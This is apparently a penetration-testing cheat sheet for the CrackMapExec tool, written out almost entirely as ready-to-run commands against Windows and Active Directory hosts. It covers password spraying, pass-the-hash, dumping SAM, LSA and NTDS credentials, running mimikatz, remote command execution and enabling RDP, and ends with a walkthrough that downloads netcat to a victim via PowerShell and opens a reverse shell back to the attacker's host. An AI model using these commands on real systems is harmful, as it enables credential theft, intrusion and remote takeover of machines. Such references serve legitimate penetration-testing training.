# crackmapexec

{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}

## CrackMapExec full cheat sheet

{% embed url="https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/" %}



## Installation

Install in python environment:

```text
apt-get install -y libssl-dev libffi-dev python-dev build-essential
pip install --user pipenv
git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
 cd CrackMapExec && pipenv install
 pipenv shell
 python setup.py install
 crackmapexec
```

![](../../../../.gitbook/assets/image%20%28256%29.png)

install on system \(might have some problems\):

```text
apt install crackmapexec
```

the overal syntax is like this:

```text
crackmapexec [protocol] [target] -u [username] -p [password] -H [hash or hash flie]
```

example:

```text
crackmapexec smb 192.168.56.115 -u Administrator -H f4750eeb6dd87b3e60faa9cc23809750 cmd.exe
```

### logs and output files

```text
/root/.cme/logs/
```

### Target Formats

```text
crackmapexec <protocol> ms.evilcorp.org
crackmapexec <protocol> 192.168.1.0 192.168.0.2
crackmapexec <protocol> 192.168.1.0/24
crackmapexec <protocol> 192.168.1.0-28 10.0.0.1-67
crackmapexec <protocol> ~/targets.txt
```

Using Credentials

```text
crackmapexec <protocol> <target(s)> -u username -p password
```

{% hint style="info" %}
When using usernames or passwords that contain special symbols, wrap them in single quotes to make your shell interpret them as a string
{% endhint %}

example:

```text
crackmapexec <protocol> <target(s)> -u username -p 'Admin!123@'
```

{% hint style="info" %}
if credentials start with ‘-’ use the long format
{% endhint %}

```text
crackmapexec <protocol> <target(s)> -u='-username' -p='-Admin!123@'
```

### Using a credential set from the database

```text
crackmapexec <protocol> <target(s)> -id <cred ID(s)>
```

### Brute Forcing & Password Spraying

```text
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
crackmapexec <protocol> <target(s)> -u /userlist -p /passlist
crackmapexec <protocol> <target(s)> -u /userlist -H /hashlist
```

### Viewing available modules for a Protocol

```text
cme <protocol> -L
```

#### using modules:

```text
cme <protocol> <target(s)> -M <module name>
```

#### Viewing module options:

```text
cme <protocol> -M <module name> --options
```

#### Using module options:

Module options are specified with the -o flag

```text
cme <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
```

### enumerate smb status of all systems in a domain

```text
crackmapexec  smb 192.168.56.1/24
```

### pass the hash

```text
crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
crackmapexec smb <target(s)> -u username -H NTHASH
```

pass the password

```text
crackmapexec smb 192.168.56.1/24 -u 'hesher' -p 'password123!'
```

## Options & Modules

### dump sam file from all owned machines

```text
--sam
```

### enumerate the domain’s password policy

```text
--pass-pol
```

### dump lsa hashes

```text
--lsa
```

### dump ntds file

```text
--ntds drsuapi
```

### enumerate all AD objects including users and groups by guessing every resource identifier \(RID\)

```text
 --rid-brute
```

### enumerate AVs in the domain

```text
-M enum_avproducts
```

### execute a command on victim machine

```text
-X whoami
```

### execute powershell commands

```text
 -X '$PSVersionTable'
```

### NULL Sessions

```text
crackmapexec smb <target(s)> -u '' -p ''
```

### enum shares

```text
--shares
```

### enumerate the disks on the hosts

```text
--disks
```

### enumerate existing sessions on the hosts

```text
--sessions
```

### list running processes

```text
-X get-process
```

### enum the directory structure

```text
-x "dir c:\\"  --exec-method smbexec

```

### enable RDP

```text
 -M rdp -o ACTION=enable
 xfreerdp /u:"hesher" /v:192.168.56.115:3389
```



## netcat or meterpreter reverse shell

First we setup our web server using Python's SimpleHTTPServer on port 443

```text
python -m SimpleHTTPServer 443
```

upload the file \( download with powershell on victim\)

```text
crackmapexec smb 192.168.56.115 -u 'hesher' -p 'password123!' -X "(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:443/nc64.exe','c:\nc64.exe')"
```

run msf and setup a multi handler

```text
use exploit/multi/handler
set payload windows/x86/shell/reverse_tcp
```

or nc listener

```text
ncat --verbose --listen 443 --keep-open --max-conns 1 --nodns
```

run nc on victim side

```text
crackmapexec smb 192.168.56.115 -u 'hesher' -p 'password123!' -X "c:\nc64.exe  -e cmd.exe 192.168.56.1 443"
```

upgrade to meterpreter session

```text
Ctrl+z
sessions -u [id]
```





